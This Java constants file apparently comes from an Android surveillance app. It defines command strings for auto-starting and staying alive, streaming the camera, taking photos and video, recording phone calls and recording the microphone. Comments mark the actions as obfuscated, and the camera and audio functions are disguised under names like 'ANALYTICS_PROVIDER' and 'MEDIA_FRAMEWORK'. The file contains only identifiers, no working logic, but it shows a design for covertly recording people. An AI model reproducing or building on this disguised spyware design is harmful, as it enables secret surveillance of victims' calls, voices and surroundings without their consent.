package com.labs.labrats;

public class Constants {
    // --- OBFUSCATED INTENT ACTIONS ---
    public static final String ACTION_AUTO_START = "com.labs.stability.ST_P_01";
    public static final String ACTION_KEEP_ALIVE = "com.labs.stability.ST_P_02";

    // --- ANALYTICS_PROVIDER (OPTICS) ---
    public static final String ACTION_START_STREAM = "OP_A_01";
    public static final String ACTION_STOP_STREAM = "OP_A_02";
    public static final String ACTION_CAPTURE_PHOTO = "OP_A_03";
    public static final String ACTION_START_RECORDING = "OP_A_04";
    public static final String ACTION_STOP_RECORDING = "OP_A_05";
    public static final String ACTION_STOP_OPTICS = "OP_A_06";

    // --- WORKMANAGER_SYNC (CORE) ---
    public static final String ACTION_START_CORE = "CR_S_01";
    public static final String ACTION_STOP_CORE = "CR_S_02";

    // --- MEDIA_FRAMEWORK (AUDIO) ---
    public static final String ACTION_START_CALL_REC = "AU_M_01";
    public static final String ACTION_STOP_CALL_REC = "AU_M_02";
    public static final String ACTION_START_MIC_REC = "AU_M_03";
    public static final String ACTION_STOP_MIC_REC = "AU_M_04";
    public static final String ACTION_CALL_STATE_CHANGED = "AU_M_05";
    public static final String ACTION_UPDATE_AUDIO_SETTINGS = "AU_M_06";
    public static final String ACTION_STOP_AUDIO = "AU_M_07";
    public static final String ACTION_START_AUDIO = "AU_M_08";
}
